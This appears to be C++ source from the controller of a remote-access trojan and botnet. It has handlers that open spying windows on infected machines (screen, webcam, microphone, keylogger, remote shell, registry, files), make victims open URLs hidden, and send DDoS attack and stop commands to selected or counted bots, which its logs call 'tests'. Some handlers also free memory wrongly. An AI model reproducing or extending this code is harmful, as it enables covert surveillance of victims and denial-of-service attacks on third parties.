void CPcView::OnCLEANApplication() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE	bToken = COMMAND_CLEAN_Application;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
	LocalFree(lpPacket);
}

void CPcView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
	LocalFree(lpPacket);
}

void CPcView::OnSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,TRUE);
	}
}

void CPcView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
		m_pListCtrl->SetCheck(i,FALSE);
	}
}

LRESULT CPcView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT CPcView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenSysInfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSysInfo	*dlg = new CSysInfo(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSINFO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSINFO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)
{
    ClientContext	*pContext = (ClientContext *)lParam;
	CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);
	//设置父窗口为卓面
    dlg->Create(IDD_REG_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CPcView::OnOpenDllDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CDllDlg	*dlg = new CDllDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_DLLDLG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = DLL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

void CPcView::OnChangeGroup() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	CChangeGroup m_group;
	if ( m_group.DoModal() == IDOK )
	{	
		
		int	nPacketLength = m_group.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		
		CString strTemp, strGroupName;
		CPcView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( _T("%s(0)"), m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
			pView->NewInitialUpdate();
			pView->m_iocpServer = m_iocpServer;
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);
			
			CString	str;
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));
			
			int nCnt = pView->m_pListCtrl->GetItemCount();
			int i = 0;
			i = pView->m_pListCtrl->InsertItem(nCnt, str, 15);
			
			pView->m_pListCtrl->SetItemText(i, 0, m_pListCtrl->GetItemText(m, 0));			
			
			pView->m_pListCtrl->SetItemText(i, 1, m_pListCtrl->GetItemText(m, 1));
			
			pView->m_pListCtrl->SetItemText(i, 2, m_pListCtrl->GetItemText(m, 2));			
			
			pView->m_pListCtrl->SetItemText(i, 3, m_pListCtrl->GetItemText(m, 3));			
			
			pView->m_pListCtrl->SetItemText(i, 4, m_pListCtrl->GetItemText(m, 4));			
			
			pView->m_pListCtrl->SetItemText(i, 5, m_pListCtrl->GetItemText(m, 5));			
			
			pView->m_pListCtrl->SetItemText(i, 6, m_pListCtrl->GetItemText(m, 6));
			
			pView->m_pListCtrl->SetItemText(i, 7, m_pListCtrl->GetItemText(m, 7));
			
			pView->m_pListCtrl->SetItemText(i, 8, m_pListCtrl->GetItemText(m, 8));
			
			pView->m_pListCtrl->SetItemText(i, 9, m_pListCtrl->GetItemText(m, 9));

			pView->m_pListCtrl->SetItemText(i, 10, m_pListCtrl->GetItemText(m, 10));

			pView->m_pListCtrl->SetItemText(i, 11, m_pListCtrl->GetItemText(m, 11));
			
			// 指定唯一标识
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			
			g_pTabView->UpDateNumber();
			g_pFrame->ShowConnectionsNumber();
			g_pFrame->ShowOSCount();
		}
	}
}

void SetClipboardText(CString &Data)
{
	if(OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CPcView::OnIp() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 0);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);
	MessageBox("主机IP已复制到剪切板");
}

void CPcView::OnDilixinxi() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 11);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
	MessageBox("主机地理信息已复制到剪切板");
}

void CPcView::OnAll() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		Name = "";
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		for(int i = 0; i < m_pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
		{
			Name += m_pListCtrl->GetItemText(nItem, i);
			Name += "	";
		}
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
	MessageBox("主机信息已复制到剪切板");
}


void CPcView::SendAutoAttack(ClientContext *Context)
{ 	
	CPcView* pView = NULL;		
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	
	if (pView->m_pListCtrl !=  m_pListCtrl)
	{
		return ;
	}
		
	int nItems = m_pListCtrl->GetItemCount();
	if ( nItems == 0)
	{
		return;
	}
	for ( int i = 0; i < nItems; i++)
	{
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
		if(pContext == Context)
		{
			WORD nSize = sizeof(DATTACK);
			LPBYTE pData = new BYTE[nSize+1];
			pData[0]=COMMAND_DDOS_ATTACK;//命令消息..
			DATTACK m_Send;
			memcpy(&m_Send, g_pConnectView->m_iocpServer->m_strbuff,nSize);
			memcpy(pData+1,&m_Send,nSize);	
			m_iocpServer->Send(Context, pData, nSize+1);
			char StrShow[20]={NULL};
			wsprintf(StrShow,"%s",m_Send.DDOSType);
			m_pListCtrl->SetItemText(i,9,StrShow);
			delete pData;
		}
	}
}

void CPcView::SendDDosAttackCommand(LPATTACK m_Attack,INT HostNums)
{
	WORD nSize = sizeof(DATTACK);

	LPBYTE pData = new BYTE[nSize+1];
	
	pData[0]=COMMAND_DDOS_ATTACK;//命令消息..
	DATTACK m_Send;
	memcpy(&m_Send,m_Attack,nSize);
	memcpy(pData+1,&m_Send,nSize);

	CHAR szStatus[500]={NULL};
	CHAR szTask[20]={NULL};
	wsprintf(szTask,"%s",m_Send.DDOSType);

	CPcView* pView = NULL;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();

	int CountNum = 0;

	if(HostNums==-1)//等于-1，说明是选中主机
	{
		for (int n = 0; n < nTabs; n++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
			int nCnt = pView->m_pListCtrl->GetItemCount();
			if ( nCnt == 0)
			{
				MessageBox("没有主机");
				return;
			}
			for ( int i = 0; i < nCnt; i++)
			{
				if(pView->m_pListCtrl->GetCheck(i) == TRUE)
				{
					//检查主机是否空闲状态
					pView->m_pListCtrl->GetItemText(i,9,szStatus,500);
					if(strcmp(szStatus,"--")==0)
					{
						ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
						// 发送DDOS 攻击命令
						m_iocpServer->Send(pContext, pData, nSize+1);
						pView->m_pListCtrl->SetItemText(i,9,szTask);
						CountNum++;
					}
				}
			}
		}
	}
	else
	{
		int iSendNum = 0;
		for (int n = 0; n < nTabs; n++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
			int nCnt = pView->m_pListCtrl->GetItemCount();
			if ( nCnt == 0)
			{
				MessageBox("没有主机");
				return;
			}
			for ( int i = 0; i < nCnt; i++)
			{
				//检查主机是否空闲状态
				pView->m_pListCtrl->GetItemText(i,9,szStatus,500);
				if(strcmp(szStatus,"--")==0)
				{
					if (iSendNum < HostNums)
					{
						ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
						// 发送DDOS 攻击命令
						m_iocpServer->Send(pContext, pData, nSize+1);
						pView->m_pListCtrl->SetItemText(i,9,szTask);
						iSendNum++;
						CountNum++;
					}
					else
					{//到数量了
						break;
					}
				}
			}
		}
	}
	delete []pData;

	CHAR szDDOS[500]={NULL};
	wsprintf(szDDOS,"已经开始测试: [%s]; 发送 [%d] 条命令.",m_Send.DDOSType,CountNum);
	g_pLogView->InsertLogItem( szDDOS, 0, 13 );

	if(g_pConnectView->m_iocpServer->m_bIsAutoD!=false)
	{
		memcpy(&m_AutoAttackData,m_Attack,sizeof(DATTACK));
	}
}

void CPcView::SendDDostStopCommand(LPSTR iTaskID)
{
	CHAR szStatus[500]={NULL};
	CHAR szTask[20]={NULL};
	wsprintf(szTask,"%s",iTaskID);
	
	BYTE pData[2]={COMMAND_DDOS_STOP,0};
	
	int CountNum = 0;
	//停止掉自动
	if(g_pConnectView->m_iocpServer->m_bIsAutoD == TRUE)
		g_pConnectView->m_iocpServer->m_bIsAutoD = FALSE;

	CPcView* pView = NULL;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();

	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		int nCnt = pView->m_pListCtrl->GetItemCount();
		if ( nCnt == 0)
		{
			MessageBox("没有主机");
			return;
		}
		for ( int i = 0; i < nCnt; i++)
		{
			//检查主机是否空闲状态
			pView->m_pListCtrl->GetItemText(i,9,szStatus,500);
			if(strcmp(szStatus,szTask)==0)
			{
				ClientContext* pContext = (ClientContext*)pView->m_pListCtrl->GetItemData(i);
				// 发送DDOS 攻击命令
				m_iocpServer->Send(pContext, &pData[0], 2);
				pView->m_pListCtrl->SetItemText(i,9,"--");
				CountNum++;
			}
		}
	}
	CHAR szDDOS[500]={NULL};
	wsprintf(szDDOS,"已经停止测试: [%s]; 发送 [%d] 条命令.",iTaskID,CountNum);

	g_pLogView->InsertLogItem( szDDOS, 0, 41 );
}

void CPcView::SeclectAll()//全选
{
	CPcView* pView = NULL;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		int nCnt = pView->m_pListCtrl->GetItemCount();
		if ( nCnt == 0)
		{
			MessageBox("没有主机");
			return;
		}
		for ( int i = 0; i < nCnt; i++)
		{
			pView->m_pListCtrl->SetCheck(i,TRUE);
		}
	}
}

void CPcView::UnSeclectAll()//全选
{
	CPcView* pView = NULL;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		int nCnt = pView->m_pListCtrl->GetItemCount();
		if ( nCnt == 0)
		{
			MessageBox("没有主机");
			return;
		}
		for ( int i = 0; i < nCnt; i++)
		{
			pView->m_pListCtrl->SetCheck(i,FALSE);
		}
	}
}
	
void CPcView::SeclectNow()//全选
{
	CPcView* pView = NULL;		
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	int nItems = pView->m_pListCtrl->GetItemCount();
	if ( nItems == 0)
	{
		MessageBox("当前分组没有主机");
		return;
	}
	for ( int i = 0; i < nItems; i++)
	{	  
		pView->m_pListCtrl->SetCheck(i,TRUE);
	}
}

void CPcView::UnSeclectNow()
{
	CPcView* pView = NULL;		
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	int nItems = pView->m_pListCtrl->GetItemCount();
	if ( nItems == 0)
	{
		MessageBox("当前分组没有主机");
		return;
	}
	for ( int i = 0; i < nItems; i++)
	{	
		pView->m_pListCtrl->SetCheck(i,FALSE);
	}
}

void CPcView::OnJincheng() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
    dlg.Init(_T("进程筛选"), _T("输入进程名，例如360.exe:"), this);
    if (dlg.DoModal() != IDOK)
        return;
    dlg.m_str.MakeLower();
    if (dlg.m_str.Find(_T(".exe")) == -1)
    {
        return;
    }
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SORT_PROCESS;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void CPcView::OnChuangkou() 
{
	// TODO: Add your command handler code here
	CInputDialog dlg;
    dlg.Init(_T("窗口"), _T("输入窗口名。"), this);
    if (dlg.DoModal() != IDOK)
        return;
    dlg.m_str.MakeLower();
    if (lstrlen(dlg.m_str) < 1)
    {
        return;
    }
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SORT_WINDOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void CPcView::OnChongzhi() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 8, "--");
	}
}

LRESULT CPcView::OnModifyList(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return 0;
	
	int nCnt = m_pListCtrl->GetItemCount();
	for (int i = 0; i < nCnt; i++)
	{
		if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
		{
			m_pListCtrl->SetItemText(i, 8, _T("Yes"));
			break;
			break;
		}
	}
    return 0;
}

LRESULT CPcView::OnNoModifyList(WPARAM wParam, LPARAM lParam)
{
    ClientContext *pContext = (ClientContext *)lParam;
    if (pContext == NULL)
        return 0;
	
	int nCnt = m_pListCtrl->GetItemCount();
	for (int i = 0; i < nCnt; i++)
	{
		if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
		{
			m_pListCtrl->SetItemText(i, 8, _T("No"));
			break;
			break;
		}
	}
    return 0;
}
